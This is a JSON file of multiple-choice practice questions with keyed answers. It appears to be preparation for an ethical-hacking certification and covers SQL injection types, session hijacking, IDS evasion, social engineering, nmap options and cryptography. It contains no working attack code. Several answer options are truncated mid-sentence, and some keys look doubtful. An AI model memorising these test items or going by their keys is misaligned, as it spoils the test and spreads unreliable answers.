    "answers": [
      "Use a protected excel file.",
      "Use a hash algorithm in the document once CFO approved the financial statements.",
      "Reports can send to the accountant using an exclusive USB for that document.",
      "Financial reports can send the financial statements twice, one by email and the"
    ],
    "correct": "Use a hash algorithm in the document once CFO approved the financial statements."
  },
  {
    "id": 91,
    "question": "The attacker enters its malicious data into intercepted messages in a TCP session since source routing is disabled. He tries to guess the responses of the client and server. What hijacking technique is described in this example?",
    "answers": [
      "Blind",
      "Registration",
      "RST",
      "TCP/IP"
    ],
    "correct": "Blind"
  },
  {
    "id": 92,
    "question": "Ivan, an evil hacker, conducts an SQLi attack that is based on True/False questions. What type of SQLi does Ivan use?",
    "answers": [
      "DMS-specific SQLi",
      "Classic SQLi",
      "Blind SQLi",
      "Compound SQLi"
    ],
    "correct": "Blind SQLi"
  },
  {
    "id": 93,
    "question": "Which of the following layers in IoT architecture helps bridge the gap between two endpoints, such as a device and a client, and carries out message routing, message identification, and subscribing?",
    "answers": [
      "Internet.",
      "Middleware.",
      "Edge Technology.",
      "Access Gateway."
    ],
    "correct": "Access Gateway."
  },
  {
    "id": 94,
    "question": "Ivan, a black hat hacker, tries to call numerous random numbers inside the company, claiming he is from the technical support service. It offers company employee services in exchange for confidential data or login credentials. What method of social engineering does Ivan use?",
    "answers": [
      "Quid Pro Quo",
      "Elicitation",
      "Tailgating",
      "Reverse Social Engineering"
    ],
    "correct": "Quid Pro Quo"
  },
  {
    "id": 95,
    "question": "Ivan, a black hat hacker, sends partial HTTP requests to the target webserver to exhaust the target server\u2019s maximum concurrent connection pool. He wants to ensure that all additional connection attempts are rejected. What type of attack does Ivan implement?",
    "answers": [
      "Fragmentation",
      "Spoofed Session Flood",
      "HTTP GET/POST",
      "Slowloris"
    ],
    "correct": "Slowloris"
  },
  {
    "id": 96,
    "question": "You have been assigned the task of defending the company from network sniffing. Which of the following is the best option for this task?",
    "answers": [
      "Register all machines MAC Address in a Centralized Database.",
      "Using encryption protocols to secure network communications.",
      "Use Static IP Address.",
      "Restrict Physical Access to Server Rooms hosting Critical Servers."
    ],
    "correct": "Using encryption protocols to secure network communications."
  },
  {
    "id": 97,
    "question": "Which of the following cipher is based on factoring the product of two large prime numbers?",
    "answers": [
      "MD5",
      "SHA-1",
      "RSA",
      "RC5"
    ],
    "correct": "RSA"
  },
  {
    "id": 98,
    "question": "Which of the following Nmap options will you use if you want to scan fewer ports than the default?",
    "answers": [
      "-sP",
      "-F",
      "-T",
      "-p"
    ],
    "correct": "-F"
  },
  {
    "id": 99,
    "question": "Which of the following protocols is used in a VPN for setting up a secure channel between two devices?",
    "answers": [
      "PEM",
      "PPP",
      "SET",
      "IPSEC"
    ],
    "correct": "IPSEC"
  },
  {
    "id": 100,
    "question": "Which of the following program attack both the boot sector and executable files?",
    "answers": [
      "Multipartite Virus",
      "Stealth virus",
      "Macro virus",
      "Polymorphic virus"
    ],
    "correct": "Multipartite Virus"
  },
  {
    "id": 101,
    "question": "Ivan, the black hat hacker, split the attack traffic into many packets such that no single packet triggers the IDS. Which IDS evasion technique does Ivan use?",
    "answers": [
      "Session Splicing.",
      "Low-bandwidth attacks.",
      "Unicode Evasion.",
      "Flooding."
    ],
    "correct": "Session Splicing."
  },
  {
    "id": 102,
    "question": "Ferdinand installs a virtual communication tower between the two authentic endpoints to mislead the victim. What attack does Ferdinand perform?",
    "answers": [
      "Sinkhole",
      "Aspidistra",
      "aLTEr",
      "Wi-Jacking"
    ],
    "correct": "aLTEr"
  },
  {
    "id": 103,
    "question": "John, a penetration tester, decided to conduct SQL injection testing. He enters a huge amount of random data and observes changes in output and security loopholes in web applications. What SQL injection testing technique did John use?",
    "answers": [
      "Fuzzing Testing.",
      "Function Testing.",
      "Static Testing.",
      "Dynamic Testing."
    ],
    "correct": "Fuzzing Testing."
  },
  {
    "id": 104,
    "question": "John, a cybersecurity specialist, received a copy of the event logs from all firewalls, Intrusion Detection Systems (IDS) and proxy servers on a company's network. He tried to match all the registered events in all the logs, and he found that their sequence didn't match. What can cause such a problem?",
    "answers": [
      "The security breach was a false positive.",
      "A proper chain of custody was not observed while collecting the logs.",
      "The attacker altered events from the logs.",
      "The network devices are not all synchronized."
    ],
    "correct": "The network devices are not all synchronized."
  },
  {
    "id": 105,
    "question": "What actions should you take if you find that the company that hired you is involved with human trafficking?",
    "answers": [
      "Confront the customer and ask her about this.",
      "Copy the information to removable media and keep it in case you need it.",
      "Stop work and contact the proper legal authorities.",
      "Ignore the information and continue the assessment until the work is done."
    ],
    "correct": "Stop work and contact the proper legal authorities."
  },
  {
    "id": 106,
    "question": "Suppose your company has implemented identify people based on walking patterns and made it part of physical control access to the office. The system works according to the following principle: The camera captures people walking and identifies employees, and then they must attach their RFID badges to access the office. Which of the following best describes this technology?",
    "answers": [
      "The solution will have a high level of false positives.",
      "Biological motion cannot be used to identify people.",
      "The solution implements the two factors authentication: physical object and physical characteristic.",
      "Although the approach has two phases, it actually implements just one authentication factor."
    ],
    "correct": "The solution implements the two factors authentication: physical object and physical characteristic."
  },
  {
    "id": 107,
    "question": "What is a \"Collision attack\"?",
    "answers": [
      "\u0421ollision attack on a hash tries to find two inputs producing the same hash",
      "Collision attacks try to change the hash.",
      "Collision attacks attempt to recover information from a hash.",
      "Collision attacks break the hash into several parts, with the same bytes in each"
    ],
    "correct": "\u0421ollision attack on a hash tries to find two inputs producing the same hash"
  },
  {
    "id": 108,
    "question": "What is meant by a \"rubber-hose\" attack in cryptography?",
    "answers": [
      "A backdoor is placed into a cryptographic algorithm by its creator.",
      "Forcing the targeted keystream through a hardware-accelerated device such as",
      "Attempting to decrypt ciphertext by making logical assumptions about the",
      "Extraction of cryptographic secrets through coercion or torture."
    ],
    "correct": "Extraction of cryptographic secrets through coercion or torture."
  },
  {
    "id": 109,
    "question": "Which layer 3 protocol allows for end-to-end encryption of the connection?",
    "answers": [
      "SFTP",
      "FTPS",
      "IPsec",
      "SSL"
    ],
    "correct": "IPsec"
  },
  {
    "id": 110,
    "question": "The attacker posted a message and an image on the forum, in which he embedded a malicious link. When the victim clicks on this link, the victim's browser sends an authenticated request to a server. What type of attack did the attacker use?",
    "answers": [
      "Session hijacking",
      "SQL injection",
      "Cross-site scripting",
      "Cross-site request forgery"
    ],
    "correct": "Cross-site request forgery"
  },
  {
    "id": 111,
    "question": "What is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program?",
    "answers": [
      "Security testing",
      "Monkey testing",
      "Fuzz testing",
      "Concolic testing"
    ],
    "correct": "Fuzz testing"
  },
  {
    "id": 112,
    "question": "Ivan, an evil hacker, is preparing to attack the network of a financial company. To do this, he wants to collect information about the operating systems used on the company's computers. Which of the following techniques will Ivan use to achieve the desired result?",
    "answers": [
      "UDP Scanning.",
      "IDLE/IPID Scanning.",
      "Banner Grabbing.",
      "SSDP Scanning."
    ],
    "correct": "Banner Grabbing."
  },
  {
    "id": 113,
    "question": "Which of the following is not included in the list of recommendations of PCI Data Security Standards?",
    "answers": [
      "Protect stored cardholder data.",
      "Do not use vendor-supplied defaults for system passwords and other security",
      "Encrypt transmission of cardholder data across open, public networks.",
      "Rotate employees handling credit card transactions on a yearly basis to different departments."
    ],
    "correct": "Rotate employees handling credit card transactions on a yearly basis to different departments."
  },
  {
    "id": 114,
    "question": "Michael, a technical specialist, discovered that the laptop of one of the employees connecting to a wireless point couldn't access the Internet, but at the same time, it can transfer files locally. He checked the IP address and the default gateway. They are both on 192.168.1.0/24. Which of the following caused the problem?",
    "answers": [
      "The laptop is using an invalid IP address.",
      "The laptop isn't using a private IP address.",
      "The laptop and the gateway are not on the same network.",
      "The gateway is not routing to a public IP address."
    ],
    "correct": "The gateway is not routing to a public IP address."
  },
  {
    "id": 115,
    "question": "Which of the following option is a security feature on switches leverages the DHCP snooping database to help prevent man-in-the-middle attacks?",
    "answers": [
      "Port security",
      "Spanning tree",
      "DHCP relay",
      "DAI"
    ],
    "correct": "DAI"
  },
  {
    "id": 116,
    "question": "Determine the attack by the description: Determine the attack by the description: The known-plaintext attack used against DES. This attack causes that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key.",
    "answers": [
      "Replay attack",
      "Man-in-the-middle attack",
      "Meet-in-the-middle attack",
      "Traffic analysis attack"
    ],
    "correct": "Meet-in-the-middle attack"
  },
  {
    "id": 117,
    "question": "Determine what of the list below is the type of honeypots that simulates the real production network of the target organization?",
    "answers": [
      "High-interaction Honeypots.",
      "Low-interaction Honeypots.",
      "Research honeypots.",
      "Pure Honeypots."
    ],
    "correct": "Pure Honeypots."
  },
  {
    "id": 118,
    "question": "Your company has a risk assessment, and according to its results, the risk of a breach in the main company application is 40%. Your cybersecurity department has made changes to the application and requested a re-assessment of the risks. The assessment showed that the risk fell to 12%, with a risk threshold of 20%. Which of the following options would be the best from a business point of view?",
    "answers": [
      "Accept the risk.",
      "Avoid the risk.",
      "Introduce more controls to bring risk to 0%.",
      "Limit the risk."
    ],
    "correct": "Accept the risk."
  },
  {
    "id": 119,
    "question": "The Web development team is holding an urgent meeting, as they have received information from testers about a new vulnerability in their Web software. They make an urgent decision to reduce the likelihood of using the vulnerability. The team beside to modify the software requirements to disallow users from entering HTML as input into their Web application. Determine the type of vulnerability that the test team found?",
    "answers": [
      "SQL injection vulnerability.",
      "Website defacement vulnerability.",
      "Cross-site Request Forgery vulnerability.",
      "Cross-site scripting vulnerability."
    ],
    "correct": "Cross-site scripting vulnerability."
  },
  {
    "id": 120,
    "question": "Based on the following data, you need to calculate the approximate cost of recovery of the system operation per year: The cost of a new hard drive is $300; The chance of a hard drive failure is 1/3; The recovery specialist earns $10/hour; Restore the OS and software to the new hard disk - 10 hours; Restore the database from the last backup to the new hard disk - 4 hours; Assume the EF = 1 (100%), calculate the SLE, ARO, and ALE.",
    "answers": [
      "$295",
      "$440",
      "$146",
      "$960"
    ],
    "correct": "$146"
  },
  {
    "id": 121,
    "question": "Identify Bluetooth attck techniques that is used in to send messages to users without the recipient's consent, for example for guerrilla marketing campaigns?",
    "answers": [
      "Bluebugging",
      "Bluesnarfing",
      "Bluejacking",
      "Bluesmacking"
    ],
    "correct": "Bluejacking"
  },
  {
    "id": 122,
    "question": "Which type of viruses tries to hide from antivirus programs by actively changing and corrupting the chosen service call interruptions when they are being run?",
    "answers": [
      "Cavity virus",
      "Stealth/Tunneling virus",
      "Tunneling virus",
      "Polymorphic virus"
    ],
    "correct": "Stealth/Tunneling virus"
  },
  {
    "id": 123,
    "question": "Define Metasploit module used to perform arbitrary, one-off actions such as port scanning, denial of service, SQL injection and fuzzing?",
    "answers": [
      "Payload Module.",
      "Auxiliary Module.",
      "NOPS Module.",
      "Exploit Module."
    ],
    "correct": "Auxiliary Module."
  },
  {
    "id": 124,
    "question": "What is the purpose of the demilitarized zone?",
    "answers": [
      "To provide a place for a honeypot.",
      "To scan all traffic coming through the DMZ to the internal network.",
      "To add an extra layer of security to an organization's local area network.",
      "To add a protect to network devices."
    ],
    "correct": "To add an extra layer of security to an organization's local area network."
  },
  {
    "id": 125,
    "question": "Identify a vulnerability in OpenSSL that allows stealing the information protected under normal conditions by the SSL/TLS encryption used to secure the Internet?",
    "answers": [
      "Heartbleed Bug",
      "Shellshock",
      "POODLE",
      "SSL/TLS Renegotiation Vulnerability"
    ],
    "correct": "Heartbleed Bug"
  },
  {
    "id": 126,
    "question": "Identify the attack by description: When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website.",
    "answers": [
      "Jamming signal attack",
      "aLTEr attack",
      "KRACK attack",
      "Wardriving"
    ],
    "correct": "aLTEr attack"
  },
  {
    "id": 127,
    "question": "Jennys wants to send a digitally signed message to Molly. What key will Jennys use to sign the message, and how will Molly verify it?",
    "answers": [
      "Jennys will sign the message with Molly\u2019s public key, and Molly will verify that the message came from Jennys by using Jenny's public key",
      "Jennys will sign the message with her public key, and Molly will verify that the message came from Jenny's by using Jenny's private key.",
      "Jennys will sign the message with Molly\u2019s private key, and Molly will verify that the message came from Jennys by using Jenny's public key",
      "Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny's public key"
    ],
    "correct": "Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny's public key"
  },
  {
    "id": 128,
    "question": "Percival, the evil hacker, found the contact number of cybersecuritycompany.org on the internet and dialled the number, claiming himself to represent a technical support team from a vendor. He informed an employee of cybersecuritycompany that a specific server would be compromised and requested the employee to follow the provided instructions. Consequently, he prompted the victim to execute unusual commands and install malicious files, which were then used to collect and pass critical information to his machine. Which of the following social engineering techniques did Percival use?",
    "answers": [
      "Phishing",
      "Diversion theft",
      "Quid pro quo",
      "Elicitation"
    ],
    "correct": "Quid pro quo"
  },
  {
    "id": 129,
    "question": "The attacker, during the attack, installed a scanner on a machine belonging to one of the employees of the target organization and scanned several machines on the same network to identify vulnerabilities to exploit further. Which of the following type of vulnerability assessment tools employed the attacker?",
    "answers": [
      "Proxy scanner.",
      "Agent-based scanner.",
      "Cluster scanner.",
      "Network-based scanner."
    ],
    "correct": "Network-based scanner."
  },
  {
    "id": 130,
    "question": "Imagine the following scenario: The hacker monitored and intercepted already established traffic between the victim and a host machine to predict the victim's ISN. The hacker sent spoofed packets with the victim's IP address to the host machine using the ISN. After this manipulation, the host machine responded with a packet having an incremented ISN. After this manipulation, the host machine responded with a packet having an incremented ISN. The victim's connection was interrupted, and the hacker was able to connect with the host machine on behalf of the victim. Which of the following attacks did the hacker perform?",
    "answers": [
      "Blind hijacking",
      "Forbidden attack",
      "TCP/IP hijacking",
      "UDP hijacking"
    ],
    "correct": "TCP/IP hijacking"
  },
  {
    "id": 131,
    "question": "You have decided to test your organization's website. For this purpose, you need a tool that can work as a proxy and save every request and response. Also, this tool must allow you to test parameters and headers manually to get more precise results than if using web vulnerability scanners. Which of the following tools is appropriate for your requirements?",
    "answers": [
      "Burp suite",
      "Proxychains",
      "Maskgen",
      "S3Scanner"
    ],
    "correct": "Burp suite"
  },
  {
    "id": 132,
    "question": "You come to a party with friends and ask the apartment owner about access to his wireless network. It tells you the name of the wireless point and its password, but when you try to connect to it, the connection occurs without asking for a password. Which of the following attacks could have occurred?",
    "answers": [
      "Evil twin attack",
      "Wireless sniffing",
      "Wardriving attack",
      "Piggybacking attack"
    ],
    "correct": "Evil twin attack"
  },
  {
    "id": 133,
    "question": "Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment?",
    "answers": [
      "Community",
      "Hybrid",
      "Private",
      "Public"
    ],
    "correct": "Community"
  },
  {
    "id": 134,
    "question": "Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it?",
    "answers": [
      "Lock all users",
      "Remove all passwords",
      "Delete the wireless network",
      "Disable SSID broadcasting"
    ],
    "correct": "Disable SSID broadcasting"
  },
  {
    "id": 135,
    "question": "Which of the following vulnerabilities will you use if you know that the target network uses WPA3 encryption?",
    "answers": [
      "Cross-site request forgery",
      "Key reinstallation attack",
      "AP misconfiguration",
      "Dragonblood"
    ],
    "correct": "Dragonblood"
  },
  {
    "id": 136,
    "question": "Marketing department employees complain that their computers are working slow and every time they attempt to go to a website, they receive a series of pop-ups with advertisements. Which of the following type of malwares infected their systems?",
    "answers": [
      "Spyware",
      "Adware",
      "Trojan",
      "Virus"
    ],
    "correct": "Adware"
  },
  {
    "id": 137,
    "question": "The attacker is trying to cheat one of the employees of the target organization by initiating fake calls while posing as a legitimate employee. Also, he sent phishing emails to steal employee's credentials and further compromise his account. Which of the following techniques did the attacker use?",
    "answers": [
      "Insider threat",
      "Password reuse",
      "Reverse engineering",
      "Social engineering"
    ],
    "correct": "Social engineering"
  },
  {
    "id": 138,
    "question": "You need to send an email containing confidential information. Your colleague advises you to use PGP to be sure that the data will be safe. What should you use to communicate correctly using this type of encryption?",
    "answers": [
      "Use your colleague's private key to encrypt the message.",
      "Use your own private key to encrypt the message.",
      "Use your own public key to encrypt the message.",
      "Use your colleague's public key to encrypt the message."
    ],
    "correct": "Use your colleague's public key to encrypt the message."
  },
  {
    "id": 139,
    "question": "You use Docker architecture in your application to employ a client/server model. And you need to use a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. Which of the following Docker components will you use for these purposes?",
    "answers": [
      "Docker registries",
      "Docker daemon",
      "Docker client",
      "Docker objects"
    ],
    "correct": "Docker daemon"
  },
  {
    "id": 140,
    "question": "Identify the attack technique by description: The attacker gains unauthorized access to the target network, remains there without being detected for a long time, and obtains sensitive information without sabotaging the organization.",
    "answers": [
      "Spear-phishing sites.",
      "Insider threat.",
      "Diversion theft.",
      "Advanced persistent threat."
    ],
    "correct": "Advanced persistent threat."
  },
  {
    "id": 141,
    "question": "During a port scan on the target host, your colleague sends FIN/ACK probes and finds that an RST packet is sent in response by the target host, indicating that the port is closed. Which of the following port scanning techniques did your colleague use?",
    "answers": [
      "Xmas scan",
      "ACK flag probe scan",
      "TCP Maimon scan",
      "IDLE/IPID header scan"
    ],
    "correct": "TCP Maimon scan"
  },
  {
    "id": 142,
    "question": "You must to identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. Which of the following nmap commands do you must use to perform the TCP SYN ping scan?",
    "answers": [
      "nmap -sn -PO < target IP address >",
      "nmap -sn -PA < target IP address >",
      "nmap -sn -PS < target IP address >",
      "nmap -sn -PP < target IP address >"
    ],
    "correct": "nmap -sn -PS < target IP address >"
  },
  {
    "id": 143,
    "question": "Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits?",
    "answers": [
      "HMAC",
      "Twofish",
      "Blowfish",
      "IDEA"
    ],
    "correct": "Twofish"
  },
  {
    "id": 144,
    "question": "Your company follows the five-tier container technology architecture. Your colleagues use container technology to deploy applications/software. In this process, they include all dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. Now they verify and validate image contents, sign images, and send them to the registries. At which of the following tiers are your colleagues currently working according to the five-tier container technology architecture?",
    "answers": [
      "Tier-1: Developer machines.",
      "Tier-3: Registries.",
      "Tier-2: Testing and accreditation systems.",
      "Tier-4: Orchestrators."
    ],
    "correct": "Tier-2: Testing and accreditation systems."
  },
  {
    "id": 145,
    "question": "Identify the technique by description: The attacker wants to create a botnet. Firstly, he collects information about a large number of vulnerable machines to create a list. Secondly, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures a very fast spreading and installation of malicious code.",
    "answers": [
      "Subnet scanning technique",
      "Hit-list scanning technique",
      "Topological scanning technique",
      "Permutation scanning technique"
    ],
    "correct": "Hit-list scanning technique"
  },
  {
    "id": 146,
    "question": "The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. Which of the following standards has the medical organization violated?",
    "answers": [
      "PCI DSS",
      "PII",
      "ISO 2002",
      "HIPAA/PHI"
    ],
    "correct": "HIPAA/PHI"
  },
  {
    "id": 147,
    "question": "A competitor organization has hired a professional hacker who could collect sensitive information about your organization. The hacker starts by gathering the server IP address of the target organization using Whois footprinting. After this, he entered the server IP address as an input to an online tool to retrieve information such as your organization's network range and identify the network topology and operating system used in the network. Which of the following tools did the hacker use for this purpose?",
    "answers": [
      "DuckDuckGo",
      "ARIN",
      "AOL",
      "Baidu"
    ],
    "correct": "ARIN"
  },
  {
    "id": 148,
    "question": "Which of the following keys can you share using asymmetric cryptography?",
    "answers": [
      "Public keys",
      "Public and private keys",
      "Private keys",
      "User passwords"
    ],
    "correct": "Public keys"
  },
  {
    "id": 149,
    "question": "Identify wireless security protocol by description: This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as 256-bit Galois/Counter Mode Protocol (GCMP-256), 84-bit Hashed Message Authentication Mode with Secure Hash Algorithm (HMAC-SHA384), and Elliptic Curve Digital Signature Algorithm (ECDSA) using a 384-bit elliptic curve.",
    "answers": [
      "WPA2-Personal",
      "WPA2-Enterprise",
      "WPA3-Personal",
      "WPA3-Enterprise"
    ],
    "correct": "WPA3-Enterprise"
  },
  {
    "id": 150,
    "question": "Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application?",
    "answers": [
      "REST API",
      "RESTful API",
      "JSON-RPC",
      "SOAP API"
    ],
    "correct": "RESTful API"
  },
  {
    "id": 151,
    "question": "Which of the following tiers in the three-tier application architecture is responsible for moving and processing data between them?",
    "answers": [
      "Application Layer",
      "Data tier",
      "Presentation tier",
      "Logic tier"
    ],
    "correct": "Logic tier"
  },
  {
    "id": 152,
    "question": "Jan 3, 2020, 9:18:35 AM 10.240.212.18 - 54373 10.202.206.19 - 22 tcp_ip Based on this log, which of the following is true?",
    "answers": [
      "Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the",
      "SSH communications are encrypted; it's impossible to know who is the client or",
      "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the",
      "Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the"
    ],
    "correct": "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the"
  },
  {
    "id": 153,
    "question": "Which of the following AAA protocols can use for authentication users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network?",
    "answers": [
      "Kerberos",
      "RADIUS",
      "DIAMETER",
      "TACACS"
    ],
    "correct": "RADIUS"
  },
  {
    "id": 154,
    "question": "Your organization's network uses the network address 192.168.1.64 with mask 255.255.255.192, and servers in your organization's network are in the addresses 192.168.1.140, 192.168.1.141 and 192.168.1.142. The attacker who wanted to find them couldn't do it. He used the following command for the network scanning: nmap 192.168.1.64/28 Why couldn't the attacker find these servers?",
    "answers": [
      "He needs to change the address to 192.168.1.0 with the same mask",
      "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28",
      "The network must be dawn and the nmap command and IP address are ok",
      "He needs to add the command \"ip address\" just before the IP address"
    ],
    "correct": "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28"
  },
  {
    "id": 155,
    "question": "The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. Which of the following advanced operators will he use to restrict the search to the organization\u2019s web domain?",
    "answers": [
      "[site:]",
      "[allinurl:]",
      "[link:]",
      "[location:]"
    ],
    "correct": "[site:]"
  },
  {
    "id": 156,
    "question": "Identify the type of hacker following description: When finding a zero-day vulnerability on a public-facing system, a hacker sends an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability.",
    "answers": [
      "White hat",
      "Black hat",
      "Gray hat",
      "Red hat"
    ],
    "correct": "White hat"
  },
  {
    "id": 157,
    "question": "You need to assess the system used by your employee. During the assessment, you found that compromise was possible through user directories, registries, and other system parameters. Also, you discovered vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software configuration errors. Which of the following types of vulnerability assessments that you conducted?",
    "answers": [
      "Database assessment",
      "Credentialed assessment",
      "Host-based assessment",
      "Distributed assessment"
    ],
    "correct": "Host-based assessment"
  },
  {
    "id": 158,
    "question": "Recently your company set up a cloud computing service. Your system administrator reached out to a telecom company to provide Internet connectivity and transport services between the organization and the cloud service provider to implement this service. Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture?",
    "answers": [
      "Cloud consumer",
      "Cloud auditor",
      "Cloud carrier",
      "Cloud broker"
    ],
    "correct": "Cloud carrier"
  },
  {
    "id": 159,
    "question": "Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. Which of the following will be the best solution for Matthew?",
    "answers": [
      "Use HTTP so that all traffic can be routed vis a browser, thus evading the",
      "Install and use Telnet to encrypt all outgoing traffic from this server.",
      "Use Alternate Data Streams to hide the outgoing packets from this server.",
      "Install Cryptcat and encrypt outgoing packets from this server."
    ],
    "correct": "Install Cryptcat and encrypt outgoing packets from this server."
  },
  {
    "id": 160,
    "question": "Andy, the evil hacker, wants to collect information about Nick. He discovered that Nick's organization recently purchased new equipment. Andy decided to call Nick masquerading as a legitimate customer support executive, informing him that their new systems need to be serviced for proper functioning and notified him that customer support would send a computer technician. Nick agreed and agreed on a date for a meeting with Andy. A few days later, Andy entered the territory of Nick's organization unhindered and gathered sensitive information by scanning terminals for passwords, searching for important documents in desks, and rummaging bins. What is the type of attack technique Andy used on Nick?",
    "answers": [
      "Eavesdropping attack.",
      "Dumpster diving attack.",
      "Impersonation attack.",
      "Shoulder surfing attack."
    ],
    "correct": "Impersonation attack."
  },
  {
    "id": 161,
    "question": "Which of the following describes \u0441ross-site request forgery?",
    "answers": [
      "Modifying the request by the proxy server between the client and the server.",
      "A browser makes a request to a server without the user's knowledge.",
      "A request sent by a malicious user from a browser to a server.",
      "A server makes a request to another server without the user's knowledge."
    ],
    "correct": "A browser makes a request to a server without the user's knowledge."
  },
  {
    "id": 162,
    "question": "Identify the Bluetooth hacking technique, which refers to the theft of information from a wireless device through Bluetooth?",
    "answers": [
      "Bluebugging",
      "Bluesnarfing",
      "Bluejacking",
      "Bluesmacking"
    ],
    "correct": "Bluesnarfing"
  },
  {
    "id": 163,
    "question": "According to Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, which of the following ranges is the medium?",
    "answers": [
      "3.0-6.9",
      "3.9-6.9",
      "4.0-6.0",
      "4.0-6.9"
    ],
    "correct": "4.0-6.9"
  },
  {
    "id": 164,
    "question": "Which of the following is a file on a web server that can be misconfigured and provide sensitive information for a hacker, such as verbose error messages?",
    "answers": [
      "idq.dll",
      "httpd.conf",
      "php.ini",
      "administration.config"
    ],
    "correct": "php.ini"
  },
  {
    "id": 165,
    "question": "Which of the following services runs directly on TCP port 445?",
    "answers": [
      "Remote procedure call (RPC)",
      "Telnet",
      "Network File System (NFS)",
      "Server Message Block (SMB)"
    ],
    "correct": "Server Message Block (SMB)"
  },
  {
    "id": 166,
    "question": "Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates?",
    "answers": [
      "Tunneling virus",
      "Cavity virus",
      "Stealth virus",
      "Encryption virus"
    ],
    "correct": "Stealth virus"
  },
  {
    "id": 167,
    "question": "During testing execution, you established a connection with your computer using the SMB service and entered your login and password in plaintext. After the testing is completed, you need to delete the data about the login and password you entered so that no one can use it. Which of the following files do you need to clear?",
    "answers": [
      ".xsession-log",
      ".bash_history",
      ".bashrc",
      ".profile"
    ],
    "correct": ".bash_history"
  },
  {
    "id": 168,
    "question": "An ethical hacker has already received all the necessary information and is now considering further actions. For example, infect a system with malware and use phishing to gain credentials to a system or web application. What phase of ethical hacking methodology is the hacker currently in?",
    "answers": [
      "Reconnaissance",
      "Scanning",
      "Gaining access",
      "Maintaining access"
    ],
    "correct": "Gaining access"
  },
  {
    "id": 169,
    "question": "Which of the following is the hacker's first step in conducting a DNS cache poisoning attack on a target organization?",
    "answers": [
      "The hacker forges a reply from the DNS resolver.",
      "The hacker uses TCP to poison the DNS resolver.",
      "The hacker queries a nameserver using the DNS resolver.",
      "The hacker makes a request to the DNS resolver."
    ],
    "correct": "The hacker makes a request to the DNS resolver."
  },
  {
    "id": 170,
    "question": "At which of the following stages of the cyber kill chain does data exfiltration occur?",
    "answers": [
      "Installation",
      "Command and control",
      "Actions on objectives",
      "Weaponization"
    ],
    "correct": "Actions on objectives"
  },
  {
    "id": 171,
    "question": "You need to describe the principal characteristics of the vulnerability and make a numerical estimate reflecting its severity using CVSS v3.0 to properly assess and prioritize the organization\u2019s vulnerability management processes. As a result of the research, you received a basic score of 4.0 according to CVSS rating. What is the CVSS severity level of the vulnerability discovered?",
    "answers": [
      "Medium",
      "Critical",
      "High",
      "Low"
    ],
    "correct": "Medium"
  },
  {
    "id": 172,
    "question": "You need to use information security controls that create an appealing isolated environment for hackers to prevent them from compromising critical targets while simultaneously gathering information about the hacker. Which of the following will you use for this purpose?",
    "answers": [
      "Intrusion detection system",
      "Honeypot",
      "Botnet",
      "Firewall"
    ],
    "correct": "Honeypot"
  },
  {
    "id": 173,
    "question": "Your organization uses LDAP for accessing distributed directory services. An attacker knowing this can try to take advantage of an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on your organization. Which of the following tools can an attacker use to gather information from the LDAP service?",
    "answers": [
      "ike-scan",
      "Zabasearch",
      "EarthExplorer",
      "JXplorer"
    ],
    "correct": "JXplorer"
  },
  {
    "id": 174,
    "question": "You were instructed to check the configuration of the webserver and you found that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. You understand that this vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information. Which of the following attacks can an attacker perform using this vulnerability?",
    "answers": [
      "DUHK attack",
      "Side-channel attack",
      "Padding oracle attack",
      "DROWN attack"
    ],
    "correct": "DROWN attack"
  },
  {
    "id": 175,
    "question": "Which of the following SQLi types leverages a database server\u2019s ability to make DNS requests to pass data to an attacker?",
    "answers": [
      "Out-of-band SQLi",
      "Union-based SQLi",
      "In-band SQLi",
      "Time-based blind SQLi"
    ],
    "correct": "Out-of-band SQLi"
  },
  {
    "id": 176,
    "question": "Antonio wants to infiltrate the target organization's network. To accomplish this task, he used a technique using which he encoded packets with Unicode characters. The target company\u2019s IDS cannot recognize the packets, but the target web server can decode them. Which of the following techniques did Antonio use to evade the IDS system?",
    "answers": [
      "Desynchronization",
      "Urgency flag",
      "Session splicing",
      "Obfuscating"
    ],
    "correct": "Obfuscating"
  },
  {
    "id": 177,
    "question": "Which of the following is a correct example of using msfvenom to generate a reverse TCP shellcode for Windows?",
    "answers": [
